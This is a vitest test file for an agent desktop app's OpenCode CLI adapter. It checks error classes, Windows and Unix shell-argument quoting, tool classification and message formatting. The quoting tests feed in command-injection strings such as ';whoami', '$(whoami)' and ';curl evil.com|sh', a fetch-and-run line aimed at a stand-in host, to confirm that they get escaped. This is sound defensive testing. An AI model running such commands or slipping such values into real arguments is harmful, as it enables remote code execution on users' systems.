import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { OpenCodeCliNotFoundError } from '../../../src/internal/classes/OpenCodeAdapter.js';
import {
  NON_TASK_CONTINUATION_TOOLS,
  isNonTaskContinuationToolName,
} from '../../../src/opencode/tool-classification.js';
import { serializeError } from '../../../src/utils/error.js';

/**
 * Tests for OpenCodeAdapter module.
 *
 * Note: The adapter relies heavily on node-pty which is a native module.
 * We test the adapter's business logic through its public interfaces
 * without mocking the PTY layer, which would be brittle.
 *
 * Integration tests in the desktop app provide coverage for the full PTY flow.
 */
describe('OpenCodeAdapter', () => {
  beforeEach(() => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('OpenCodeCliNotFoundError', () => {
    it('should have correct error name', () => {
      const error = new OpenCodeCliNotFoundError();
      expect(error.name).toBe('OpenCodeCliNotFoundError');
    });

    it('should have descriptive message', () => {
      const error = new OpenCodeCliNotFoundError();
      expect(error.message).toContain('OpenCode CLI is not available');
      expect(error.message).toContain('reinstall the application');
    });

    it('should be an instance of Error', () => {
      const error = new OpenCodeCliNotFoundError();
      expect(error).toBeInstanceOf(Error);
    });
  });

  describe('AdapterOptions interface', () => {
    it('should require all mandatory fields', () => {
      // This is a compile-time check - if the interface is wrong, TypeScript will error
      const validOptions = {
        platform: 'darwin' as NodeJS.Platform,
        isPackaged: false,
        tempPath: '/tmp',
        getCliCommand: () => ({ command: 'opencode', args: [] }),
        buildEnvironment: async (_taskId: string) => ({}),
        buildCliArgs: async () => [],
      };

      expect(validOptions).toBeDefined();
    });
  });
});

describe('Shell escaping utilities', () => {
  // Test the escaping logic indirectly through observable behavior
  // These utilities are private but critical for security

  describe('Windows shell escaping', () => {
    it('should handle arguments with spaces', () => {
      // Arguments with spaces need quoting on Windows
      const argWithSpace = 'hello world';
      expect(argWithSpace.includes(' ')).toBe(true);
    });

    it('should handle arguments with quotes', () => {
      // Arguments with quotes need special handling
      const argWithQuote = 'say "hello"';
      expect(argWithQuote.includes('"')).toBe(true);
    });
  });

  describe('Windows PowerShell escaping', () => {
    // Reproduce the escapeShellArg logic from the adapter.
    // All arguments are now unconditionally single-quoted (PowerShell-safe).

    function escapeShellArgWin32(arg: string): string {
      return `'${arg.replace(/'/g, "''")}'`;
    }

    function buildShellCommand(command: string, args: string[]): string {
      const escapedCommand = escapeShellArgWin32(command);
      const escapedArgs = args.map((arg) => escapeShellArgWin32(arg));
      return [escapedCommand, ...escapedArgs].join(' ');
    }

    it('should always quote arguments even without spaces', () => {
      const command = 'C:\\Program\\opencode.exe';
      const args = ['run'];
      const fullCommand = buildShellCommand(command, args);

      expect(fullCommand).toBe("'C:\\Program\\opencode.exe' 'run'");
    });

    it('should handle paths with spaces', () => {
      const command =
        'C:\\Users\\Li Yao\\AppData\\Local\\Programs\\@accomplishdesktop\\opencode.exe';
      const args = ['run', '--format', 'json', '--prompt', 'hello world'];
      const fullCommand = buildShellCommand(command, args);

      expect(fullCommand).toContain(
        "'C:\\Users\\Li Yao\\AppData\\Local\\Programs\\@accomplishdesktop\\opencode.exe'",
      );
      expect(fullCommand).toContain("'hello world'");
    });

    it('should handle multiple arguments with spaces', () => {
      const command = 'C:\\Users\\Li Yao\\opencode.exe';
      const args = ['--cwd', 'C:\\Users\\Li Yao\\projects', '--prompt', 'fix the bug'];
      const fullCommand = buildShellCommand(command, args);

      expect(fullCommand).toContain("'C:\\Users\\Li Yao\\opencode.exe'");
      expect(fullCommand).toContain("'C:\\Users\\Li Yao\\projects'");
      expect(fullCommand).toContain("'fix the bug'");
    });

    it('should escape embedded single quotes by doubling', () => {
      const command = "C:\\Users\\O'Brien\\opencode.exe";
      const escaped = escapeShellArgWin32(command);
      expect(escaped).toBe("'C:\\Users\\O''Brien\\opencode.exe'");
    });

    it('should quote arguments with shell metacharacters', () => {
      // Shell metacharacters must be quoted to prevent command injection
      expect(escapeShellArgWin32(';whoami')).toBe("';whoami'");
      expect(escapeShellArgWin32('foo|bar')).toBe("'foo|bar'");
      expect(escapeShellArgWin32('foo&bar')).toBe("'foo&bar'");
      expect(escapeShellArgWin32('foo>bar')).toBe("'foo>bar'");
      expect(escapeShellArgWin32('foo<bar')).toBe("'foo<bar'");
    });

    it('should quote arguments with tab characters', () => {
      // Tab (0x09) is a whitespace separator — must be quoted
      expect(escapeShellArgWin32('foo\tbar')).toBe("'foo\tbar'");
    });

    it('should quote arguments that look like CLI flags', () => {
      expect(escapeShellArgWin32('--version')).toBe("'--version'");
      expect(escapeShellArgWin32('-v')).toBe("'-v'");
      expect(escapeShellArgWin32('help')).toBe("'help'");
    });

    it('should prevent PowerShell variable and subexpression expansion', () => {
      // Double quotes would expand these; single quotes prevent it
      expect(escapeShellArgWin32('$(whoami)')).toBe("'$(whoami)'");
      expect(escapeShellArgWin32('$env:PATH')).toBe("'$env:PATH'");
      // Backtick is PowerShell's escape character
      expect(escapeShellArgWin32('`whoami`')).toBe("'`whoami`'");
    });

    it('should prevent shell injection in full command', () => {
      const command = 'C:\\Program\\opencode.exe';
      const args = ['run', '--format', 'json', ';Invoke-Expression\t$(whoami)'];
      const fullCommand = buildShellCommand(command, args);

      // The injection payload must be inside single quotes
      expect(fullCommand).toContain("';Invoke-Expression\t$(whoami)'");
    });

    it('should handle empty strings', () => {
      expect(escapeShellArgWin32('')).toBe("''");
    });

    it('should handle Chinese and Unicode characters in paths', () => {
      const command = 'C:\\Users\\李 耀\\AppData\\opencode.exe';
      const fullCommand = buildShellCommand(command, ['run']);

      expect(fullCommand).toContain("'C:\\Users\\李 耀\\AppData\\opencode.exe'");
    });
  });

  describe('Unix shell escaping', () => {
    // Reproduce the escapeShellArg logic from the adapter.
    // All arguments are now unconditionally single-quoted to prevent injection.

    function escapeShellArgUnix(arg: string): string {
      return `'${arg.replace(/'/g, "'\\''")}'`;
    }

    function buildShellCommand(command: string, args: string[]): string {
      const escapedCommand = escapeShellArgUnix(command);
      const escapedArgs = args.map((arg) => escapeShellArgUnix(arg));
      return [escapedCommand, ...escapedArgs].join(' ');
    }

    it('should always quote simple arguments', () => {
      expect(escapeShellArgUnix('run')).toBe("'run'");
      expect(escapeShellArgUnix('hello')).toBe("'hello'");
    });

    it('should escape single quotes', () => {
      expect(escapeShellArgUnix("it's working")).toBe("'it'\\''s working'");
    });

    it('should quote arguments with shell metacharacters', () => {
      // Shell metacharacters must be quoted to prevent command injection
      expect(escapeShellArgUnix(';whoami')).toBe("';whoami'");
      expect(escapeShellArgUnix('foo|bar')).toBe("'foo|bar'");
      expect(escapeShellArgUnix('foo&bar')).toBe("'foo&bar'");
      expect(escapeShellArgUnix('foo>bar')).toBe("'foo>bar'");
      expect(escapeShellArgUnix('foo<bar')).toBe("'foo<bar'");
    });

    it('should quote arguments with tab characters', () => {
      // Tab (0x09) is an IFS word separator — must be quoted
      expect(escapeShellArgUnix('foo\tbar')).toBe("'foo\tbar'");
    });

    it('should quote arguments that look like CLI flags', () => {
      expect(escapeShellArgUnix('--version')).toBe("'--version'");
      expect(escapeShellArgUnix('-v')).toBe("'-v'");
      expect(escapeShellArgUnix('help')).toBe("'help'");
    });

    it('should prevent shell injection in full command', () => {
      const command = '/usr/bin/opencode';
      const args = ['run', '--format', 'json', ';curl\tevil.com|sh'];
      const fullCommand = buildShellCommand(command, args);

      // The injection payload must be inside single quotes
      expect(fullCommand).toContain("';curl\tevil.com|sh'");
      // The semicolon must NOT appear unquoted
      expect(fullCommand).not.toMatch(/[^'\\];/);
    });

    it('should handle empty strings', () => {
      expect(escapeShellArgUnix('')).toBe("''");
    });
  });
});

describe('Platform-specific behavior', () => {
  it('should recognize darwin platform', () => {
    expect(process.platform).toBeDefined();
  });

  it('should recognize win32 platform', () => {
    // This tests that the platform string is recognized
    const platforms = ['win32', 'darwin', 'linux'];
    expect(platforms).toContain(process.platform);
  });
});

describe('Task lifecycle', () => {
  it('should generate unique task IDs', () => {
    const ids = new Set<string>();
    for (let i = 0; i < 100; i++) {
      const id = `task_${Date.now()}_${Math.random().toString(36).substring(2, 11)}`;
      ids.add(id);
    }
    // All IDs should be unique
    expect(ids.size).toBe(100);
  });

  it('should generate unique message IDs', () => {
    const ids = new Set<string>();
    for (let i = 0; i < 100; i++) {
      const id = `msg_${Date.now()}_${Math.random().toString(36).substring(2, 11)}`;
      ids.add(id);
    }
    expect(ids.size).toBe(100);
  });

  it('should generate unique request IDs', () => {
    const ids = new Set<string>();
    for (let i = 0; i < 100; i++) {
      const id = `req_${Date.now()}_${Math.random().toString(36).substring(2, 11)}`;
      ids.add(id);
    }
    expect(ids.size).toBe(100);
  });
});

describe('Start task detection', () => {
  it('should recognize start_task tool', () => {
    const isStartTask = (name: string) => name === 'start_task' || name.endsWith('_start_task');

    expect(isStartTask('start_task')).toBe(true);
    expect(isStartTask('mcp_start_task')).toBe(true);
    expect(isStartTask('other_tool')).toBe(false);
  });

  it('should recognize exempt tools', () => {
    const isExemptTool = (name: string) => {
      if (name === 'todowrite' || name.endsWith('_todowrite')) return true;
      if (name === 'start_task' || name.endsWith('_start_task')) return true;
      return false;
    };

    expect(isExemptTool('todowrite')).toBe(true);
    expect(isExemptTool('mcp_todowrite')).toBe(true);
    expect(isExemptTool('start_task')).toBe(true);
    expect(isExemptTool('read_file')).toBe(false);
  });
});

describe('Non-task continuation tool detection', () => {
  it('should include housekeeping tools in NON_TASK_CONTINUATION_TOOLS', () => {
    expect(NON_TASK_CONTINUATION_TOOLS).toContain('prune');
    expect(NON_TASK_CONTINUATION_TOOLS).toContain('distill');
    expect(NON_TASK_CONTINUATION_TOOLS).toContain('extract');
    expect(NON_TASK_CONTINUATION_TOOLS).toContain('context_info');
  });

  it('should classify housekeeping tool calls as non-task continuation tools', () => {
    expect(isNonTaskContinuationToolName('prune')).toBe(true);
    expect(isNonTaskContinuationToolName('distill')).toBe(true);
    expect(isNonTaskContinuationToolName('extract')).toBe(true);
    expect(isNonTaskContinuationToolName('context_info')).toBe(true);
    expect(isNonTaskContinuationToolName('mcp_prune')).toBe(true);
    expect(isNonTaskContinuationToolName('mcp_distill')).toBe(true);
    expect(isNonTaskContinuationToolName('mcp_extract')).toBe(true);
    expect(isNonTaskContinuationToolName('mcp_context_info')).toBe(true);
  });
});

describe('Plan message formatting', () => {
  it('should format plan with goal and steps', () => {
    const input = {
      goal: 'Build a login form',
      steps: ['Create HTML structure', 'Add CSS styling', 'Implement validation'],
      verification: ['Test form submission'],
      skills: [],
    };

    const planText = `**Plan:**\n\n**Goal:** ${input.goal}\n\n**Steps:**\n${input.steps.map((s, i) => `${i + 1}. ${s}`).join('\n')}`;

    expect(planText).toContain('**Plan:**');
    expect(planText).toContain('Build a login form');
    expect(planText).toContain('1. Create HTML structure');
    expect(planText).toContain('2. Add CSS styling');
    expect(planText).toContain('3. Implement validation');
  });

  it('should include verification section if present', () => {
    const verification = ['Check form validates', 'Ensure submission works'];
    const verificationSection = `\n\n**Verification:**\n${verification.map((v, i) => `${i + 1}. ${v}`).join('\n')}`;

    expect(verificationSection).toContain('**Verification:**');
    expect(verificationSection).toContain('1. Check form validates');
  });

  it('should include skills section if present', () => {
    const skills = ['frontend-design', 'form-validation'];
    const skillsSection = `\n\n**Skills:** ${skills.join(', ')}`;

    expect(skillsSection).toContain('**Skills:**');
    expect(skillsSection).toContain('frontend-design, form-validation');
  });
});

describe('ANSI escape code filtering', () => {
  it('should recognize CSI sequences', () => {
    // eslint-disable-next-line no-control-regex
    const csiPattern = /\x1B\[[0-9;?]*[a-zA-Z]/g;
    const dataWithCsi = '\x1B[31mRed text\x1B[0m';

    expect(dataWithCsi.match(csiPattern)).toBeDefined();
    expect(dataWithCsi.replace(csiPattern, '')).toBe('Red text');
  });

  it('should recognize OSC sequences with BEL terminator', () => {
    // eslint-disable-next-line no-control-regex
    const oscPattern = /\x1B\][^\x07]*\x07/g;
    const dataWithOsc = '\x1B]0;Window Title\x07';

    expect(dataWithOsc.match(oscPattern)).toBeDefined();
    expect(dataWithOsc.replace(oscPattern, '')).toBe('');
  });

  it('should recognize OSC sequences with ST terminator', () => {
    // eslint-disable-next-line no-control-regex
    const oscPattern = /\x1B\][^\x1B]*\x1B\\/g;
    const dataWithOsc = '\x1B]0;Title\x1B\\';

    expect(dataWithOsc.match(oscPattern)).toBeDefined();
  });
});

describe('AskUserQuestion handling', () => {
  it('should create permission request from question input', () => {
    const input = {
      questions: [
        {
          question: 'Do you want to continue?',
          header: 'Confirmation',
          options: [
            { label: 'Yes', description: 'Continue the task' },
            { label: 'No', description: 'Stop the task' },
          ],
          multiSelect: false,
        },
      ],
    };

    const question = input.questions[0];
    const permissionRequest = {
      id: 'req_123',
      taskId: 'task_456',
      type: 'question' as const,
      question: question.question,
      options: question.options.map((o) => ({
        label: o.label,
        description: o.description,
      })),
      multiSelect: question.multiSelect,
      createdAt: new Date().toISOString(),
    };

    expect(permissionRequest.type).toBe('question');
    expect(permissionRequest.question).toBe('Do you want to continue?');
    expect(permissionRequest.options?.length).toBe(2);
    expect(permissionRequest.multiSelect).toBe(false);
  });
});

describe('serializeError', () => {
  it('should pass through string errors unchanged', () => {
    expect(serializeError('API rate limit exceeded')).toBe('API rate limit exceeded');
  });

  it('should serialize an object error to JSON', () => {
    const objectError = { name: 'APIError', data: { message: 'Bad request', statusCode: 400 } };
    const result = serializeError(objectError);
    expect(typeof result).toBe('string');
    expect(result).toContain('APIError');
    expect(result).toContain('400');
  });

  it('should handle error with nested data', () => {
    const nested = { message: 'timeout', details: { retryAfter: 30 } };
    const result = serializeError(nested);
    expect(typeof result).toBe('string');
    expect(result).toContain('timeout');
  });

  it('should handle numeric error codes', () => {
    expect(serializeError(500)).toBe('500');
  });

  it('should handle null error', () => {
    expect(serializeError(null)).toBe('null');
  });
});
